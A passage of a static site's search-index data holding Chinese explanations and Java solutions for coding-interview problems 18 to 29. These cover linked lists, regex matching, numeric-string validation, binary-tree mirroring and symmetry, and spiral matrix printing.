}`}]},{path:"/%E9%A2%98%E8%A7%A3/18.1%20%E5%9C%A8%20O(1)%20%E6%97%B6%E9%97%B4%E5%86%85%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E8%8A%82%E7%82%B9.html",title:"18.1 \u5728 O(1) \u65F6\u95F4\u5185\u5220\u9664\u94FE\u8868\u8282\u70B9",pathLocale:"/",contents:[{header:"18.1 \u5728 O(1) \u65F6\u95F4\u5185\u5220\u9664\u94FE\u8868\u8282\u70B9",slug:"_18-1-\u5728-o-1-\u65F6\u95F4\u5185\u5220\u9664\u94FE\u8868\u8282\u70B9",content:""},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u2460 \u5982\u679C\u8BE5\u8282\u70B9\u4E0D\u662F\u5C3E\u8282\u70B9\uFF0C\u90A3\u4E48\u53EF\u4EE5\u76F4\u63A5\u5C06\u4E0B\u4E00\u4E2A\u8282\u70B9\u7684\u503C\u8D4B\u7ED9\u8BE5\u8282\u70B9\uFF0C\u7136\u540E\u4EE4\u8BE5\u8282\u70B9\u6307\u5411\u4E0B\u4E0B\u4E2A\u8282\u70B9\uFF0C\u518D\u5220\u9664\u4E0B\u4E00\u4E2A\u8282\u70B9\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1176f9e1-3442-4808-a47a-76fbaea1b806.png" width="600)
\u2461 \u5426\u5219\uFF0C\u5C31\u9700\u8981\u5148\u904D\u5386\u94FE\u8868\uFF0C\u627E\u5230\u8282\u70B9\u7684\u524D\u4E00\u4E2A\u8282\u70B9\uFF0C\u7136\u540E\u8BA9\u524D\u4E00\u4E2A\u8282\u70B9\u6307\u5411 null\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4bf8d0ba-36f0-459e-83a0-f15278a5a157.png" width="600)
\u7EFC\u4E0A\uFF0C\u5982\u679C\u8FDB\u884C N \u6B21\u64CD\u4F5C\uFF0C\u90A3\u4E48\u5927\u7EA6\u9700\u8981\u64CD\u4F5C\u8282\u70B9\u7684\u6B21\u6570\u4E3A N-1+N=2N-1\uFF0C\u5176\u4E2D N-1 \u8868\u793A N-1 \u4E2A\u4E0D\u662F\u5C3E\u8282\u70B9\u7684\u6BCF\u4E2A\u8282\u70B9\u4EE5 O(1) \u7684\u65F6\u95F4\u590D\u6742\u5EA6\u64CD\u4F5C\u8282\u70B9\u7684\u603B\u6B21\u6570\uFF0CN \u8868\u793A 1 \u4E2A\u5C3E\u8282\u70B9\u4EE5 O(N) \u7684\u65F6\u95F4\u590D\u6742\u5EA6\u64CD\u4F5C\u8282\u70B9\u7684\u603B\u6B21\u6570\u3002(2N-1)/N ~ 2\uFF0C\u56E0\u6B64\u8BE5\u7B97\u6CD5\u7684\u5E73\u5747\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\u3002
public ListNode deleteNode(ListNode head, ListNode tobeDelete) { if (head == null || tobeDelete == null) return null; if (tobeDelete.next != null) { // \u8981\u5220\u9664\u7684\u8282\u70B9\u4E0D\u662F\u5C3E\u8282\u70B9 ListNode next = tobeDelete.next; tobeDelete.val = next.val; tobeDelete.next = next.next; } else { if (head == tobeDelete) // \u53EA\u6709\u4E00\u4E2A\u8282\u70B9 head = null; else { ListNode cur = head; while (cur.next != tobeDelete) cur = cur.next; cur.next = null; } } return head;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/18.2%20%E5%88%A0%E9%99%A4%E9%93%BE%E8%A1%A8%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E7%BB%93%E7%82%B9.html",title:"18.2 \u5220\u9664\u94FE\u8868\u4E2D\u91CD\u590D\u7684\u7ED3\u70B9",pathLocale:"/",contents:[{header:"18.2 \u5220\u9664\u94FE\u8868\u4E2D\u91CD\u590D\u7684\u7ED3\u70B9",slug:"_18-2-\u5220\u9664\u94FE\u8868\u4E2D\u91CD\u590D\u7684\u7ED3\u70B9",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/17e301df-52e8-4886-b593-841a16d13e44.png" width="450)'},{header:"\u89E3\u9898\u63CF\u8FF0",slug:"\u89E3\u9898\u63CF\u8FF0",content:`public ListNode deleteDuplication(ListNode pHead) { if (pHead == null || pHead.next == null) return pHead; ListNode next = pHead.next; if (pHead.val == next.val) { while (next != null && pHead.val == next.val) next = next.next; return deleteDuplication(next); } else { pHead.next = deleteDuplication(pHead.next); return pHead; }
}`}]},{path:"/%E9%A2%98%E8%A7%A3/19.%20%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D.html",title:"19. \u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D",pathLocale:"/",contents:[{header:"19. \u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D",slug:"_19-\u6B63\u5219\u8868\u8FBE\u5F0F\u5339\u914D",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u8BF7\u5B9E\u73B0\u4E00\u4E2A\u51FD\u6570\u7528\u6765\u5339\u914D\u5305\u62EC '.' \u548C '*' \u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u3002\u6A21\u5F0F\u4E2D\u7684\u5B57\u7B26 '.' \u8868\u793A\u4EFB\u610F\u4E00\u4E2A\u5B57\u7B26\uFF0C\u800C '*' \u8868\u793A\u5B83\u524D\u9762\u7684\u5B57\u7B26\u53EF\u4EE5\u51FA\u73B0\u4EFB\u610F\u6B21\uFF08\u5305\u542B 0 \u6B21\uFF09\u3002
\u5728\u672C\u9898\u4E2D\uFF0C\u5339\u914D\u662F\u6307\u5B57\u7B26\u4E32\u7684\u6240\u6709\u5B57\u7B26\u5339\u914D\u6574\u4E2A\u6A21\u5F0F\u3002\u4F8B\u5982\uFF0C\u5B57\u7B26\u4E32 "aaa" \u4E0E\u6A21\u5F0F "a.a" \u548C "ab*ac*a" \u5339\u914D\uFF0C\u4F46\u662F\u4E0E "aa.a" \u548C "ab*a" \u5747\u4E0D\u5339\u914D\u3002`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5E94\u8BE5\u6CE8\u610F\u5230\uFF0C'.' \u662F\u7528\u6765\u5F53\u505A\u4E00\u4E2A\u4EFB\u610F\u5B57\u7B26\uFF0C\u800C '*' \u662F\u7528\u6765\u91CD\u590D\u524D\u9762\u7684\u5B57\u7B26\u3002\u8FD9\u4E24\u4E2A\u7684\u4F5C\u7528\u4E0D\u540C\uFF0C\u4E0D\u80FD\u628A '.' \u7684\u4F5C\u7528\u548C '*' \u8FDB\u884C\u7C7B\u6BD4\uFF0C\u4ECE\u800C\u628A\u5B83\u5F53\u6210\u91CD\u590D\u524D\u9762\u5B57\u7B26\u4E00\u6B21\u3002
public boolean match(String str, String pattern) { int m = str.length(), n = pattern.length(); boolean[][] dp = new boolean[m + 1][n + 1]; dp[0][0] = true; for (int i = 1; i <= n; i++) if (pattern.charAt(i - 1) == '*') dp[0][i] = dp[0][i - 2]; for (int i = 1; i <= m; i++) for (int j = 1; j <= n; j++) if (str.charAt(i - 1) == pattern.charAt(j - 1) || pattern.charAt(j - 1) == '.') dp[i][j] = dp[i - 1][j - 1]; else if (pattern.charAt(j - 1) == '*') if (pattern.charAt(j - 2) == str.charAt(i - 1) || pattern.charAt(j - 2) == '.') { dp[i][j] |= dp[i][j - 1]; // a* counts as single a dp[i][j] |= dp[i - 1][j]; // a* counts as multiple a dp[i][j] |= dp[i][j - 2]; // a* counts as empty } else dp[i][j] = dp[i][j - 2]; // a* only counts as empty return dp[m][n];
}`}]},{path:"/%E9%A2%98%E8%A7%A3/20.%20%E8%A1%A8%E7%A4%BA%E6%95%B0%E5%80%BC%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2.html",title:"20. \u8868\u793A\u6570\u503C\u7684\u5B57\u7B26\u4E32",pathLocale:"/",contents:[{header:"20. \u8868\u793A\u6570\u503C\u7684\u5B57\u7B26\u4E32",slug:"_20-\u8868\u793A\u6570\u503C\u7684\u5B57\u7B26\u4E32",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`true "+100"
"5e2"
"-123"
"3.1416"
"-1E-16"
false "12e"
"1a3.14"
"1.2.3"
"+-5"
"12e+4.3"`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u6B63\u5219\u8868\u8FBE\u5F0F\u8FDB\u884C\u5339\u914D\u3002
[] \uFF1A \u5B57\u7B26\u96C6\u5408
() \uFF1A \u5206\u7EC4
? \uFF1A \u91CD\u590D 0 ~ 1 \u6B21
+ \uFF1A \u91CD\u590D 1 ~ n \u6B21
* \uFF1A \u91CD\u590D 0 ~ n \u6B21
. \uFF1A \u4EFB\u610F\u5B57\u7B26
\\\\. \uFF1A \u8F6C\u4E49\u540E\u7684 .
\\\\d \uFF1A \u6570\u5B57
public boolean isNumeric (String str) { if (str == null || str.length() == 0) return false; return new String(str).matches("[+-]?\\\\d*(\\\\.\\\\d+)?([eE][+-]?\\\\d+)?");
}`}]},{path:"/%E9%A2%98%E8%A7%A3/21.%20%E8%B0%83%E6%95%B4%E6%95%B0%E7%BB%84%E9%A1%BA%E5%BA%8F%E4%BD%BF%E5%A5%87%E6%95%B0%E4%BD%8D%E4%BA%8E%E5%81%B6%E6%95%B0%E5%89%8D%E9%9D%A2.html",title:"21. \u8C03\u6574\u6570\u7EC4\u987A\u5E8F\u4F7F\u5947\u6570\u4F4D\u4E8E\u5076\u6570\u524D\u9762",pathLocale:"/",contents:[{header:"21. \u8C03\u6574\u6570\u7EC4\u987A\u5E8F\u4F7F\u5947\u6570\u4F4D\u4E8E\u5076\u6570\u524D\u9762",slug:"_21-\u8C03\u6574\u6570\u7EC4\u987A\u5E8F\u4F7F\u5947\u6570\u4F4D\u4E8E\u5076\u6570\u524D\u9762",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u9700\u8981\u4FDD\u8BC1\u5947\u6570\u548C\u5947\u6570\uFF0C\u5076\u6570\u548C\u5076\u6570\u4E4B\u95F4\u7684\u76F8\u5BF9\u4F4D\u7F6E\u4E0D\u53D8\uFF0C\u8FD9\u548C\u4E66\u672C\u4E0D\u592A\u4E00\u6837\u3002\u4F8B\u5982\u5BF9\u4E8E [1,2,3,4,5]\uFF0C\u8C03\u6574\u540E\u5F97\u5230 [1,3,5,2,4]\uFF0C\u800C\u4E0D\u80FD\u662F {5,1,3,4,2} \u8FD9\u79CD\u76F8\u5BF9\u4F4D\u7F6E\u6539\u53D8\u7684\u7ED3\u679C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d03a2efa-ef19-4c96-97e8-ff61df8061d3.png" width="200px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u65B9\u6CD5\u4E00\uFF1A\u521B\u5EFA\u4E00\u4E2A\u65B0\u6570\u7EC4\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6 O(N)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(N)\u3002
public int[] reOrderArray (int[] nums) { // \u5947\u6570\u4E2A\u6570 int oddCnt = 0; for (int x : nums) if (!isEven(x)) oddCnt++; int[] copy = nums.clone(); int i = 0, j = oddCnt; for (int num : copy) { if (num % 2 == 1) nums[i++] = num; else nums[j++] = num; } return nums;
} private boolean isEven(int x) { return x % 2 == 0;
}
\u65B9\u6CD5\u4E8C\uFF1A\u4F7F\u7528\u5192\u6CE1\u601D\u60F3\uFF0C\u6BCF\u6B21\u90FD\u5C06\u5F53\u524D\u5076\u6570\u4E0A\u6D6E\u5230\u5F53\u524D\u6700\u53F3\u8FB9\u3002\u65F6\u95F4\u590D\u6742\u5EA6 O(N2)\uFF0C\u7A7A\u95F4\u590D\u6742\u5EA6 O(1)\uFF0C\u65F6\u95F4\u6362\u7A7A\u95F4\u3002
public int[] reOrderArray(int[] nums) { int N = nums.length; for (int i = N - 1; i > 0; i--) { for (int j = 0; j < i; j++) { if (isEven(nums[j]) && !isEven(nums[j + 1])) { swap(nums, j, j + 1); } } } return nums;
} private boolean isEven(int x) { return x % 2 == 0;
} private void swap(int[] nums, int i, int j) { int t = nums[i]; nums[i] = nums[j]; nums[j] = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/22.%20%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%AC%20K%20%E4%B8%AA%E7%BB%93%E7%82%B9.html",title:"22. \u94FE\u8868\u4E2D\u5012\u6570\u7B2C K \u4E2A\u7ED3\u70B9",pathLocale:"/",contents:[{header:"22. \u94FE\u8868\u4E2D\u5012\u6570\u7B2C K \u4E2A\u7ED3\u70B9",slug:"_22-\u94FE\u8868\u4E2D\u5012\u6570\u7B2C-k-\u4E2A\u7ED3\u70B9",content:"\u725B\u5BA2\u7F51"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u8BBE\u94FE\u8868\u7684\u957F\u5EA6\u4E3A N\u3002\u8BBE\u7F6E\u4E24\u4E2A\u6307\u9488 P1 \u548C P2\uFF0C\u5148\u8BA9 P1 \u79FB\u52A8 K \u4E2A\u8282\u70B9\uFF0C\u5219\u8FD8\u6709 N - K \u4E2A\u8282\u70B9\u53EF\u4EE5\u79FB\u52A8\u3002\u6B64\u65F6\u8BA9 P1 \u548C P2 \u540C\u65F6\u79FB\u52A8\uFF0C\u53EF\u4EE5\u77E5\u9053\u5F53 P1 \u79FB\u52A8\u5230\u94FE\u8868\u7ED3\u5C3E\u65F6\uFF0CP2 \u79FB\u52A8\u5230\u7B2C N - K \u4E2A\u8282\u70B9\u5904\uFF0C\u8BE5\u4F4D\u7F6E\u5C31\u662F\u5012\u6570\u7B2C K \u4E2A\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6b504f1f-bf76-4aab-a146-a9c7a58c2029.png" width="500)
public ListNode FindKthToTail(ListNode head, int k) { if (head == null) return null; ListNode P1 = head; while (P1 != null && k-- > 0) P1 = P1.next; if (k > 0) return null; ListNode P2 = head; while (P1 != null) { P1 = P1.next; P2 = P2.next; } return P2;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/23.%20%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%8E%AF%E7%9A%84%E5%85%A5%E5%8F%A3%E7%BB%93%E7%82%B9.html",title:"23. \u94FE\u8868\u4E2D\u73AF\u7684\u5165\u53E3\u7ED3\u70B9",pathLocale:"/",contents:[{header:"23. \u94FE\u8868\u4E2D\u73AF\u7684\u5165\u53E3\u7ED3\u70B9",slug:"_23-\u94FE\u8868\u4E2D\u73AF\u7684\u5165\u53E3\u7ED3\u70B9",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:"\u4E00\u4E2A\u94FE\u8868\u4E2D\u5305\u542B\u73AF\uFF0C\u8BF7\u627E\u51FA\u8BE5\u94FE\u8868\u7684\u73AF\u7684\u5165\u53E3\u7ED3\u70B9\u3002\u8981\u6C42\u4E0D\u80FD\u4F7F\u7528\u989D\u5916\u7684\u7A7A\u95F4\u3002"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4F7F\u7528\u53CC\u6307\u9488\uFF0C\u4E00\u4E2A\u5FEB\u6307\u9488 fast \u6BCF\u6B21\u79FB\u52A8\u4E24\u4E2A\u8282\u70B9\uFF0C\u4E00\u4E2A\u6162\u6307\u9488 slow \u6BCF\u6B21\u79FB\u52A8\u4E00\u4E2A\u8282\u70B9\u3002\u56E0\u4E3A\u5B58\u5728\u73AF\uFF0C\u6240\u4EE5\u4E24\u4E2A\u6307\u9488\u5FC5\u5B9A\u76F8\u9047\u5728\u73AF\u4E2D\u7684\u67D0\u4E2A\u8282\u70B9\u4E0A\u3002
\u5047\u8BBE\u73AF\u5165\u53E3\u8282\u70B9\u4E3A y1\uFF0C\u76F8\u9047\u6240\u5728\u8282\u70B9\u4E3A z1\u3002
\u5047\u8BBE\u5FEB\u6307\u9488 fast \u5728\u5708\u5185\u7ED5\u4E86 N \u5708\uFF0C\u5219\u603B\u8DEF\u5F84\u957F\u5EA6\u4E3A x+Ny+(N-1)z\u3002z \u4E3A (N-1) \u500D\u662F\u56E0\u4E3A\u5FEB\u6162\u6307\u9488\u6700\u540E\u5DF2\u7ECF\u5728 z1 \u8282\u70B9\u76F8\u9047\u4E86\uFF0C\u540E\u9762\u5C31\u4E0D\u9700\u8981\u518D\u8D70\u4E86\u3002
\u800C\u6162\u6307\u9488 slow \u603B\u8DEF\u5F84\u957F\u5EA6\u4E3A x+y\u3002
\u56E0\u4E3A\u5FEB\u6307\u9488\u662F\u6162\u6307\u9488\u7684\u4E24\u500D\uFF0C\u56E0\u6B64 x+Ny+(N-1)z = 2(x+y)\u3002
\u6211\u4EEC\u8981\u627E\u7684\u662F\u73AF\u5165\u53E3\u8282\u70B9 y1\uFF0C\u4E5F\u53EF\u4EE5\u770B\u6210\u5BFB\u627E\u957F\u5EA6 x \u7684\u503C\uFF0C\u56E0\u6B64\u6211\u4EEC\u5148\u5C06\u4E0A\u9762\u7684\u7B49\u503C\u5206\u89E3\u4E3A\u548C x \u6709\u5173\uFF1Ax=(N-2)y+(N-1)z\u3002
\u4E0A\u9762\u7684\u7B49\u503C\u6CA1\u6709\u5F88\u5F3A\u7684\u89C4\u5F8B\uFF0C\u4F46\u662F\u6211\u4EEC\u53EF\u4EE5\u53D1\u73B0 y+z \u5C31\u662F\u5706\u73AF\u7684\u603B\u957F\u5EA6\uFF0C\u56E0\u6B64\u6211\u4EEC\u5C06\u4E0A\u9762\u7684\u7B49\u5F0F\u518D\u5206\u89E3\uFF1Ax=(N-2)(y+z)+z\u3002\u8FD9\u4E2A\u7B49\u5F0F\u5DE6\u8FB9\u662F\u4ECE\u8D77\u70B9x1 \u5230\u73AF\u5165\u53E3\u8282\u70B9 y1 \u7684\u957F\u5EA6\uFF0C\u800C\u53F3\u8FB9\u662F\u5728\u5706\u73AF\u4E2D\u8D70\u8FC7 (N-2) \u5708\uFF0C\u518D\u4ECE\u76F8\u9047\u70B9 z1 \u518D\u8D70\u8FC7\u957F\u5EA6\u4E3A z \u7684\u957F\u5EA6\u3002\u6B64\u65F6\u6211\u4EEC\u53EF\u4EE5\u53D1\u73B0\u5982\u679C\u8BA9\u4E24\u4E2A\u6307\u9488\u540C\u65F6\u4ECE\u8D77\u70B9 x1 \u548C\u76F8\u9047\u70B9 z1 \u5F00\u59CB\uFF0C\u6BCF\u6B21\u53EA\u8D70\u8FC7\u4E00\u4E2A\u8DDD\u79BB\uFF0C\u90A3\u4E48\u6700\u540E\u4ED6\u4EEC\u4F1A\u5728\u73AF\u5165\u53E3\u8282\u70B9\u76F8\u9047\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bb7fc182-98c2-4860-8ea3-630e27a5f29f.png" width="500)
public ListNode EntryNodeOfLoop(ListNode pHead) { if (pHead == null || pHead.next == null) return null; ListNode slow = pHead, fast = pHead; do { fast = fast.next.next; slow = slow.next; } while (slow != fast); fast = pHead; while (slow != fast) { slow = slow.next; fast = fast.next; } return slow;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/24.%20%E5%8F%8D%E8%BD%AC%E9%93%BE%E8%A1%A8.html",title:"24. \u53CD\u8F6C\u94FE\u8868",pathLocale:"/",contents:[{header:"24. \u53CD\u8F6C\u94FE\u8868",slug:"_24-\u53CD\u8F6C\u94FE\u8868",content:"NowCoder"},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u9012\u5F52",slug:"\u9012\u5F52",content:`public ListNode ReverseList(ListNode head) { if (head == null || head.next == null) return head; ListNode next = head.next; head.next = null; ListNode newHead = ReverseList(next); next.next = head; return newHead;
}`},{header:"\u8FED\u4EE3",slug:"\u8FED\u4EE3",content:`\u4F7F\u7528\u5934\u63D2\u6CD5\u3002
public ListNode ReverseList(ListNode head) { ListNode newList = new ListNode(-1); while (head != null) { ListNode next = head.next; head.next = newList.next; newList.next = head; head = next; } return newList.next;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/25.%20%E5%90%88%E5%B9%B6%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E7%9A%84%E9%93%BE%E8%A1%A8.html",title:"25. \u5408\u5E76\u4E24\u4E2A\u6392\u5E8F\u7684\u94FE\u8868",pathLocale:"/",contents:[{header:"25. \u5408\u5E76\u4E24\u4E2A\u6392\u5E8F\u7684\u94FE\u8868",slug:"_25-\u5408\u5E76\u4E24\u4E2A\u6392\u5E8F\u7684\u94FE\u8868",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c094d2bc-ec75-444b-af77-d369dfb6b3b4.png" width="400)'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u9012\u5F52",slug:"\u9012\u5F52",content:`public ListNode Merge(ListNode list1, ListNode list2) { if (list1 == null) return list2; if (list2 == null) return list1; if (list1.val <= list2.val) { list1.next = Merge(list1.next, list2); return list1; } else { list2.next = Merge(list1, list2.next); return list2; }
}`},{header:"\u8FED\u4EE3",slug:"\u8FED\u4EE3",content:`public ListNode Merge(ListNode list1, ListNode list2) { ListNode head = new ListNode(-1); ListNode cur = head; while (list1 != null && list2 != null) { if (list1.val <= list2.val) { cur.next = list1; list1 = list1.next; } else { cur.next = list2; list2 = list2.next; } cur = cur.next; } if (list1 != null) cur.next = list1; if (list2 != null) cur.next = list2; return head.next;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/26.%20%E6%A0%91%E7%9A%84%E5%AD%90%E7%BB%93%E6%9E%84.html",title:"26. \u6811\u7684\u5B50\u7ED3\u6784",pathLocale:"/",contents:[{header:"26. \u6811\u7684\u5B50\u7ED3\u6784",slug:"_26-\u6811\u7684\u5B50\u7ED3\u6784",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/84a5b15a-86c5-4d8e-9439-d9fd5a4699a1.jpg" width="450)'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public boolean HasSubtree(TreeNode root1, TreeNode root2) { if (root1 == null || root2 == null) return false; return isSubtreeWithRoot(root1, root2) || HasSubtree(root1.left, root2) || HasSubtree(root1.right, root2);
} private boolean isSubtreeWithRoot(TreeNode root1, TreeNode root2) { if (root2 == null) return true; if (root1 == null) return false; if (root1.val != root2.val) return false; return isSubtreeWithRoot(root1.left, root2.left) && isSubtreeWithRoot(root1.right, root2.right);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/27.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E9%95%9C%E5%83%8F.html",title:"27. \u4E8C\u53C9\u6811\u7684\u955C\u50CF",pathLocale:"/",contents:[{header:"27. \u4E8C\u53C9\u6811\u7684\u955C\u50CF",slug:"_27-\u4E8C\u53C9\u6811\u7684\u955C\u50CF",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c12221f-729e-4c22-b0ba-0dfc909f8adf.jpg" width="300)'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`public TreeNode Mirror(TreeNode root) { if (root == null) return root; swap(root); Mirror(root.left); Mirror(root.right); return root;
} private void swap(TreeNode root) { TreeNode t = root.left; root.left = root.right; root.right = t;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/28.%20%E5%AF%B9%E7%A7%B0%E7%9A%84%E4%BA%8C%E5%8F%89%E6%A0%91.html",title:"28. \u5BF9\u79F0\u7684\u4E8C\u53C9\u6811",pathLocale:"/",contents:[{header:"28. \u5BF9\u79F0\u7684\u4E8C\u53C9\u6811",slug:"_28-\u5BF9\u79F0\u7684\u4E8C\u53C9\u6811",content:"NowCoder"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c12221f-729e-4c22-b0ba-0dfc909f8adf.jpg" width="300)'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`boolean isSymmetrical(TreeNode pRoot) { if (pRoot == null) return true; return isSymmetrical(pRoot.left, pRoot.right);
} boolean isSymmetrical(TreeNode t1, TreeNode t2) { if (t1 == null && t2 == null) return true; if (t1 == null || t2 == null) return false; if (t1.val != t2.val) return false; return isSymmetrical(t1.left, t2.right) && isSymmetrical(t1.right, t2.left);
}`}]},{path:"/%E9%A2%98%E8%A7%A3/29.%20%E9%A1%BA%E6%97%B6%E9%92%88%E6%89%93%E5%8D%B0%E7%9F%A9%E9%98%B5.html",title:"29. \u987A\u65F6\u9488\u6253\u5370\u77E9\u9635",pathLocale:"/",contents:[{header:"29. \u987A\u65F6\u9488\u6253\u5370\u77E9\u9635",slug:"_29-\u987A\u65F6\u9488\u6253\u5370\u77E9\u9635",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u6309\u987A\u65F6\u9488\u7684\u65B9\u5411\uFF0C\u4ECE\u5916\u5230\u91CC\u6253\u5370\u77E9\u9635\u7684\u503C\u3002\u4E0B\u56FE\u7684\u77E9\u9635\u6253\u5370\u7ED3\u679C\u4E3A\uFF1A1, 2, 3, 4, 8, 12, 16, 15, 14, 13, 9, 5, 6, 7, 11, 10
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104010349296.png" width="300px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u4E00\u5C42\u4E00\u5C42\u4ECE\u5916\u5230\u91CC\u6253\u5370\uFF0C\u89C2\u5BDF\u53EF\u77E5\u6BCF\u4E00\u5C42\u6253\u5370\u90FD\u6709\u76F8\u540C\u7684\u5904\u7406\u6B65\u9AA4\uFF0C\u552F\u4E00\u4E0D\u540C\u7684\u662F\u4E0A\u4E0B\u5DE6\u53F3\u7684\u8FB9\u754C\u4E0D\u540C\u4E86\u3002\u56E0\u6B64\u4F7F\u7528\u56DB\u4E2A\u53D8\u91CF r1, r2, c1, c2 \u5206\u522B\u5B58\u50A8\u4E0A\u4E0B\u5DE6\u53F3\u8FB9\u754C\u503C\uFF0C\u4ECE\u800C\u5B9A\u4E49\u5F53\u524D\u6700\u5916\u5C42\u3002\u6253\u5370\u5F53\u524D\u6700\u5916\u5C42\u7684\u987A\u5E8F\uFF1A\u4ECE\u5DE6\u5230\u53F3\u6253\u5370\u6700\u4E0A\u4E00\u884C->\u4ECE\u4E0A\u5230\u4E0B\u6253\u5370\u6700\u53F3\u4E00\u884C->\u4ECE\u53F3\u5230\u5DE6\u6253\u5370\u6700\u4E0B\u4E00\u884C->\u4ECE\u4E0B\u5230\u4E0A\u6253\u5370\u6700\u5DE6\u4E00\u884C\u3002\u5E94\u5F53\u6CE8\u610F\u53EA\u6709\u5728 r1 != r2 \u65F6\u624D\u6253\u5370\u6700\u4E0B\u4E00\u884C\uFF0C\u4E5F\u5C31\u662F\u5728\u5F53\u524D\u6700\u5916\u5C42\u7684\u884C\u6570\u5927\u4E8E 1 \u65F6\u624D\u6253\u5370\u6700\u4E0B\u4E00\u884C\uFF0C\u8FD9\u662F\u56E0\u4E3A\u5F53\u524D\u6700\u5916\u5C42\u53EA\u6709\u4E00\u884C\u65F6\uFF0C\u7EE7\u7EED\u6253\u5370\u6700\u4E0B\u4E00\u884C\uFF0C\u4F1A\u5BFC\u81F4\u91CD\u590D\u6253\u5370\u3002\u6253\u5370\u6700\u5DE6\u4E00\u884C\u4E5F\u8981\u505A\u540C\u6837\u5904\u7406\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201104010609223.png" width="500px">
